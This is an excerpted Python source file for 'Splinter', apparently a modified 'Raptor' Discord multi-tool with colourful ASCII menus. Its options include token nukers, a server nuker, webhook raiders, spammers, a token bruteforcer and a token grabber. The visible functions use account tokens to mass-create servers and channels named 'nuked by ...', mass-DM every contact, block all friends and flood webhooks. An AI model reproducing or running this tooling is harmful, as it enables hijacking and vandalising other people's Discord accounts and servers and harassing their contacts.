...
print(Fore.WHITE +f'''
{Fore.WHITE} _______   __                                                                         
{Fore.WHITE}/       \ /  |                                                                      
{Fore.WHITE}$$$$$$$  |$$/   ______   _______   __     __  ______   _______   __    __   ______      
{Fore.WHITE}$$ |__$$ |/  | /      \ /       \ /  \   /  |/      \ /       \ /  |  /  | /      \     {Fore.YELLOW}     ▄   ▄
{Fore.BLUE}$$    $$< $$ |/$$$$$$  |$$$$$$$  |$$  \ /$$//$$$$$$  |$$$$$$$  |$$ |  $$ |/$$$$$$  |    {Fore.YELLOW} ▄█▄ █▀█▀█ ▄█▄
{Fore.BLUE}$$$$$$$  |$$ |$$    $$ |$$ |  $$ | $$  /$$/ $$    $$ |$$ |  $$ |$$ |  $$ |$$    $$ |    {Fore.YELLOW}▀▀████▄█▄████▀▀
{Fore.RED}$$ |__$$ |$$ |$$$$$$$$/ $$ |  $$ |  $$ $$/  $$$$$$$$/ $$ |  $$ |$$ \__$$ |$$$$$$$$/     {Fore.YELLOW}     ▀█▀█▀
{Fore.RED}$$    $$/ $$ |$$       |$$ |  $$ |   $$$/   $$       |$$ |  $$ |$$    $$/ $$       |    {Fore.WHITE}By protocole_.
{Fore.RED}$$$$$$$/  $$/  $$$$$$$/ $$/   $$/     $/     $$$$$$$/ $$/   $$/  $$$$$$/   $$$$$$$/     
''')
...
def demander_identifiants():
    nom_utilisateur = input(f"{Back.RED}{Fore.BLACK}[Nom d'utilisateur]:{Style.RESET_ALL}")
    mot_de_passe = input(f"{Back.RED}{Fore.BLACK}[Mot de passe]:{Style.RESET_ALL}")
    return nom_utilisateur, mot_de_passe

def authentification():
    while True:
        tentative_nom, tentative_mot_de_passe = demander_identifiants()
        if tentative_nom == IDENTIFIANT and tentative_mot_de_passe == MOT_DE_PASSE:
...
def tool():
  ...
  nolist = ["no", "n", "nope", "nah", "ne","nay","never","non","nn"]
  yeslist = ["yes", "y", "yer", "yeah","yessir","ye","okay","yep","yea","ok","k","yh","sure","oui","oe","ui"]
  ...
  def options1():
    ...
    os.system('cls' if os.name=='nt' else 'clear')
    ctypes.windll.kernel32.SetConsoleTitleW("Splinter Multi Tools protocole_. \__(*-*)__/ <3")
    print(f'''
    {Fore.BLUE}                    _ _       _            {Fore.WHITE} ___.           __            
    {Fore.BLUE}          ___ _ __ | (_)_ __ | |_ ___ _ __ {Fore.WHITE} \_ |__   _____/  |______     
    {Fore.BLUE}         / __| '_ \| | | '_ \| __/ _ \ '__|{Fore.WHITE}  | __ \_/ __ \   __\__  \    
    {Fore.BLUE}         \__ \ |_) | | | | | | ||  __/ |   {Fore.WHITE}  | \_\ \  ___/|  |  / __ \_  
    {Fore.BLUE}         |___/ .__/|_|_|_| |_|\__\___|_|   {Fore.WHITE}  |___  /\___  >__| (____  /  
    {Fore.BLUE}             |_|                           {Fore.WHITE}      \/     \/          \/    
    {Fore.RED}                                  By protocole_.   	                             
    {Fore.RED}                        ╔═══════════════════════════════╗
    {Fore.RED}                        ║        {Fore.BLUE}Raptor modified        {Fore.RED}║ 
    {Fore.RED}                        ╚═══════════════════════════════╝
    ''')                                                                                                                                                
    print(Fore.WHITE + '╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╗')
    print(Fore.WHITE +f'║     {Fore.RED}RAIDE/NUKE               {Fore.WHITE}║     {Fore.RED}GEN                  {Fore.WHITE}║     {Fore.RED}EXTRAS                   {Fore.WHITE}║')
    print(Fore.WHITE +f'║     {Fore.BLUE}[01] TOKEN JOINER        {Fore.WHITE}║     {Fore.BLUE}[09] TOKENS          {Fore.WHITE}║     {Fore.BLUE}[15] TOKEN BRUTEFORCER   {Fore.WHITE}║')
    print(Fore.WHITE +f'║     {Fore.BLUE}[02] AIO WEBHOOK RAIDERS {Fore.WHITE}║     {Fore.BLUE}[10] NITRO           {Fore.WHITE}║     {Fore.BLUE}[16] TOKEN CHECKER       {Fore.WHITE}║')
    print(Fore.BLUE +f'║     {Fore.BLUE}[03] AIO TOKEN NUKERS    {Fore.BLUE}║     {Fore.BLUE}[11] PROXY           {Fore.BLUE}║     {Fore.BLUE}[17] PFP CHANGER         {Fore.BLUE}║')
    print(Fore.BLUE +f'║     {Fore.BLUE}[04] SERVER NUKER        {Fore.BLUE}║     {Fore.BLUE}[12] GRABBER         {Fore.BLUE}║     {Fore.BLUE}[18] BIO CHANGER         {Fore.BLUE}║')
    print(Fore.BLUE +f'║     {Fore.BLUE}[05] SERVER SPAMMER      {Fore.BLUE}║     {Fore.BLUE}[13] MEMBER IDS      {Fore.BLUE}║     {Fore.BLUE}[19] HYPEQUAD CHANGER    {Fore.BLUE}║')
    print(Fore.BLUE +f'║     {Fore.BLUE}[06] FRIEND SPAMMER      {Fore.BLUE}║     {Fore.BLUE}[14] NAMES           {Fore.BLUE}║     {Fore.BLUE}[20] INFO TOKEN          {Fore.BLUE}║')
    print(Fore.RED +f'║     {Fore.BLUE}[07] ONLINER             {Fore.RED}║     {Fore.BLUE}[DS]Discord Server   {Fore.RED}║     {Fore.BLUE}[21] TOKEN LOGIN         {Fore.RED}║')         
    print(Fore.RED +f'║     {Fore.BLUE}[08] TOKEN LEAVER        {Fore.RED}║     {Fore.GREEN}[CC]CREDITS          {Fore.RED}║     {Fore.RED}[EX] EXIT                {Fore.RED}║')   
    print(Fore.RED + '║                              ║                          ║                              ║')
    print(Fore.RED + '╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╝')
    print(Fore.WHITE + f'┌─[{Fore.RED}Splinter{Fore.WHITE}]──[{Fore.RED}~{Fore.WHITE}]─[{Fore.RED}menu{Fore.WHITE}]:')
    global options
    options = input(Fore.WHITE + '└─────► ')
  ...
  \033[31m  | | (_) |   <  __/ | | | | |\  | |_| |   <  __/ |   
    |_|\___/|_|\_\___|_| |_| |_| \_|\__,_|_|\_\___|_|   
      ...
      def servercreate():
          ...
          for x in range(15):
              try:
                r = requests.post(url,headers=header, json={'name':"Nuked By vigipirate", 'icon':image})
      ...
      def channelmake():
          ...
          for b in range(length):
              for i in range(15):
                  ...
                  r = requests.post(url1, headers=header, json={'name':'nuked-by-kizumy'})
...
''')
    ...
    {Fore.RED}   | |_| | |_) | | | ||  __/ | | (_| | ||  __/ 
        ...
        for user in massdms:
          payload = {
            'content':'ACCOUNT NUKED BY vigipirate'
          }
        ...
        print(Fore.RED + "Blocked all friends")
        ...
        def servercreate():
            ...
            for x in range(15):
                try:
                    r = requests.post(url2,headers=header, json={'name':"Nuked By miyamura_xx", 'icon':image})
                    if r.status_code == 200 or 204 or 201:
                        print("Done!")
                        ids.append(r.json()['id'])
                    else:
        ...
        def channelmake():
            ...
            for b in range(length):
                for i in range(15):
                    url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                    r = requests.post(url1, headers=header, json={'name':'nuked-by-stck'})
...
{Fore.RED} | |___| | | |  __/ (__|   <  __/ |   
  ...
  def pfpmanager():
    ...
    ''')
    print(Fore.WHITE + f'┌─[{Fore.RED}Splinter{Fore.WHITE}]──[{Fore.RED}~{Fore.WHITE}]─[{Fore.RED}PfpChanger{Fore.WHITE}]:')
    global options
...
{Fore.RED} | |_| | (_) | | | | |  __/ |   
  ...
  def webhooks():
    ...
    options2 = input(f'''
{Fore.WHITE} __        __   _     _                 _      ____       _     _               
...
{Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  |  _ < (_| | | (_| |  __/ |  \__ |
    ...
    {Fore.WHITE}┌─[{Fore.RED}Webhook{Fore.WHITE}]──[{Fore.RED}~{Fore.WHITE}]─[{Fore.RED}Discord{Fore.WHITE}]
    └─────► ''')
...
{Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |___| | | |  __/ (__|   <  __/ |   
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\  \____|_| |_|\___|\___|_|\_\___|_|                                                                                           
      ...
      hookcheck = input(Fore.BLUE + 'What is your webhook link?: ')
      ...
      print(f'Webhook Name: {Fore.BLUE}{r.json()["name"]}')
      print(f'{Fore.RESET}Webhook ID: {Fore.BLUE}{r.json()["id"]}')
      print(f'{Fore.RESET}Guild ID of Webhook: {Fore.WHITE}{r.json()["guild_id"]}')
      print(f'{Fore.RESET}Channel ID of Webhook: {Fore.WHITE}{r.json()["channel_id"]}')
      if r.json()['avatar'] == 'null':
          print(f'{Fore.RESET}Avatar: {Fore.RED} None')
      else:
          avatar = f'https://cdn.discordapp.com/avatars/{r.json()["id"]}/{r.json()["avatar"]}'
          print(f'{Fore.RESET}Avatar: {Fore.GREEN}{avatar}')
      print(f'{Fore.RESET}Token of Webhook :{Fore.RED}{r.json()["token"]}')
    ...
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\  \____|_|  \___|\__,_|\__\___/|_|   
        ...
        def spammer():
            ...
            for x in range(1):
                ...
                r = requests.post(url,headers=header,json={'name':'Nuked By stck'})
        ...
        print("Finished! Created 10 webhooks named *Nuked by stck* and with avatars named *Raptor*")
...
{Fore.RED} | |__| (_) | (_| | | | | |
 ...
 \033[31m| |___| | |  __/ (_| | | |_\__ \ 
  \____|_|  \___|\__,_|_|\__|___/
    ...
    ''')
    By = Fore.LIGHTBLACK_EX + 'Raptor Multi Tools modified by protocole ¯\_(*-*)_/¯'
    Developer = Fore.BLUE + ' "Developer": protocole'
    Crew= Fore.RED + 'The End'
    Owner = Fore.WHITE + 'discord: protocole_.'
  ...
  def discordserver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Rejoins notre serveur Discord")
    print(f'''
{Fore.WHITE}  ____  _                       _  
...
{Fore.RED} | |_| | \__ \ (_| (_) | | | (_| | 
 |____/|_|___/\___\___/|_|  \__,_| 
  ...
  [</]'''))
    ...
    if whichserver == 1:
      webbrowser.open('https://discord.gg/NDZa8CHgx8')
    else:  
      print("Invalid Option.")
 ...
 |_| \_|\__,_|_|\_\___|_|                             
    ...
    class UNuker:
        ...
        async def NukeStart(self):
            cls()
            chh = 'nuked-by-splinter'
            cha = input(f"Channel Amount: ")
            rn = 'NUKED BY SPLINTER'
            ...
            e = requests.patch(url, headers=headerrs, json={'name':"Nuked By Splinter", 'icon':image})
...
{Fore.RED} | |__|  __/ (_| |\ V /  __/ |   
 |_____\___|\__,_| \_/ \___|_|    
  ...
  if options in ['1', '01']:
    ...
    login()
  elif options in ['EX','ex']:
    exit()
  elif options in ['04','4']:
    nuker()
  elif options in ['17']:
    pfpmanager()
  elif options in ['DS','ds']:
    discordserver()
  elif options in ['5','05']:
    tokenspammer()
  elif options in ['CC','cc']:
    credits()
  elif options in ['SB','sb']:
    os.system('node C:\\Users\\stocl\\Desktop\\Splintermodif\\SplinterBot\\src\\index.js')
  else:
    print("Invalid Option")
